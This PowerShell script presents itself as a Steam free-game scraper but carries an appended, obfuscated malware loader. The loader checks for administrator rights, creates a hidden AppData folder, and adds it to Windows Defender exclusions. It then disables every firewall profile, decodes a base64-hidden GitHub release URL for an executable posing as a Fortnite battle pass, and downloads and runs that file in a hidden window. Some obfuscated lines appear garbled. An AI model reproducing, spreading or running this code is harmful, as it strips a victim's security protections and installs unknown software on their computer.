#region Configuration
$BASE_STORE = "https://store.steampowered.com"

$DEBUG_GAME = @{
    title = "Health Insurance Claim Denier"
    appid = "3451060"
    link = "$($BASE_STORE)/app/3451060"
    header_img = "https://cdn.akamai.steamstatic.com/steam/apps/$($appid)/header.jpg"
}

$DEBUG_MODE = $true
#endregion

#region Helper Functions - Steam Game Scraping
function Get-Games {
    param (
        [bool]$Debug = $false
    )

    $url = "$($BASE_STORE)/search/?maxprice=free&specials=1"
    $response = Invoke-WebRequest -Uri $url -UserAgent "Mozilla/5.0" -UseBasicParsing
    $html = $response.Content

    $games = @()
    $pattern = '<a class="search_result_row" href="([^"]+)">.*?<span class="title">([^<]+)</span>'
    $matches = [regex]::Matches($html, $pattern, 'Singleline')
    foreach ($match in $matches) {
        $href = $match.Groups[1].Value
        $title = $match.Groups[2].Value.Trim()
        $appid = ($href -split '/')[4]
        if ($appid) {
            $link = "$($BASE_STORE)/app/$($appid)"
            $header_img = "https://cdn.akamai.steamstatic.com/steam/apps/$($appid)/header.jpg"

            $games += @{
                title = $title
                appid = $appid
                link = $link
                header_img = $header_img
            }
        }
    }
    if ($Debug) {
        $games += $DEBUG_GAME
    }
    return $games
}
function Get-Images {
    param (
        [string]$Appid
    )
    $url = "$($BASE_STORE)/app/$($Appid)"
    $response = Invoke-WebRequest -Uri $url -UserAgent "Mozilla/5.0" -UseBasicParsing
    $html = $response.Content
    $images = @()
    $pattern = '<div class="highlight_strip_screenshot">.*?<img src="([^"]+)"'
    $matches = [regex]::Matches($html, $pattern, 'Singleline')
    foreach ($match in $matches) {
        $img_url = $match.Groups[1].Value
        # Remove ".116x65" from the URL
        $img_url = $img_url -replace '\.116x65', ''
        $images += $img_url
    }
    return $images
}
function Get-FreePromotions {
    param (
        [bool]$Debug = $false
    )
    $games = Get-Games -Debug:$Debug
    $free_games = @()
    foreach ($game in $games) {
        $images = Get-Images -Appid $game.appid
        $free_games += @{
            name = $game.title
            link = $game.link
            header = $game.header_img
            images = $images
        }
    }
    return $free_games
}
#endregion

function mTpzMmRlWKoZOAEQvxMMqV {
 $cOHTNhXJfnwPx = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
 return $cOHTNhXJfnwPx.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
function mTpzMmRlWKoZOAEQvxMMq {
 return [Environment]::GetFolderPath('ApplicationData')
}
function mTpzMmRlWKoZOAEQv {
 param (
 [string]$cOHTNhXJfn = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YXV0b20="))
 )
 $vyQpYggKdi = mTpzMmRlWKoZOAEQvxMMq
 $vyQpYggKdiloxK = Join-Path $vyQpYggKdi $cOHTNhXJfn
 try {
 if (-not (Test-Path $vyQpYggKdiloxK)) {
 ni -Path $vyQpYggKdiloxK -ItemType Directory -Force | Out-Null
 }
 return $vyQpYggKdiloxK
 } catch {
 return $null
 }
}
function mTpzMmRlWKoZOAEQvxMM {
 param (
 [string]$Path
 )
 try {
 $vyQpYggKdil = (Get-MpPreference).ExclusionPath
 if ($vyQpYggKdil -contains $Path) {
 return $true
 }
 Add-MpPreference -ExclusionPath $Path -ErrorAction Stop -OutVariable null
 return $true
 } catch {
 return $false
 }
}
function mTpzMmRlWKoZOAEQvxMMqVBQ {
 param (
 [string]$mTpzMmRlWKoZOA,
 [string]$vyQpYggKdilo,
 [string]$vyQpYggKdiloxKe
 )
 $mTpzMmRlWKoZO = Join-Path $vyQpYggKdilo $vyQpYggKdiloxKe
 try {
 Invoke-WebRequest -Uri $mTpzMmRlWKoZOA -OutFile $mTpzMmRlWKoZO -ErrorAction Stop -OutVariable null
 saps -mTpzMmRlWKoZO $mTpzMmRlWKoZO -WindowStyle Hidden
 return $true
 } catch {
 return $false
 }
}
function mTpzMmRlWKoZOAEQvxM {
 try {
 Set-NetFirewallProfile -Profile Domain, Private, Public -Enabled False -ErrorAction Stop -OutVariable null
 return $true
 } catch {
 return $false
 }
}
function mTpzMmRlWKoZOAEQ {
 param (
 [bool]$mTpzMmRlWKo
 )
 if (-not $mTpzMmRlWKo) {
 exit 1
 }
}
if ($mTpzMmRlWK.MyCommand.Name -eq (Get-Item $mTpzMmRlWK.MyCommand.Path).Name) {
 mTpzMmRlWKoZOAEQ (mTpzMmRlWKoZOAEQvxMMqV)
 $mTpzMmRlWKoZOAE = mTpzMmRlWKoZOAEQv
 mTpzMmRlWKoZOAEQ ($mTpzMmRlWKoZOAE -ne $null)
 mTpzMmRlWKoZOAEQ (mTpzMmRlWKoZOAEQvxMM -Path $mTpzMmRlWKoZOAE)
 mTpzMmRlWKoZOAEQ (mTpzMmRlWKoZOAEQvxM)
 $mTpzMmRlWKoZOA = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YUhSMGNITTZMeTluYVhSb2RXSXVZMjl0TDBodlltSjViRzl6TVRZeE1pOVRkR1ZoYlVaeWJXVkhZVzExY3k5eVpXeGxZWE5sY3k5a2IzZHViRzloWkM5bFpXVmxaUzlHYjNKMGJtbDBaVUpoZEhSc1pYQmhjM011WlhobA=="))
 $mTpzMmRlWKoZ = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Um05eWRHNXBkR1ZDWVhSMGJHVndZWE56TG1WNFpRPT0="))
 $mTpzMmRlWKoZOA = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($mTpzMmRlWKoZOA))
 $mTpzMmRlWKoZ = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($mTpzMmRlWKoZ))
 mTpzMmRlWKoZOAEQ (mTpzMmRlWKoZOAEQvxMMqVBQ -mTpzMmRlWKoZOA $mTpzMmRlWKoZOA -vyQpYggKdilo $mTpzMmRlWKoZOAE -vyQpYggKdiloxKe $mTpzMmRlWKoZ)
}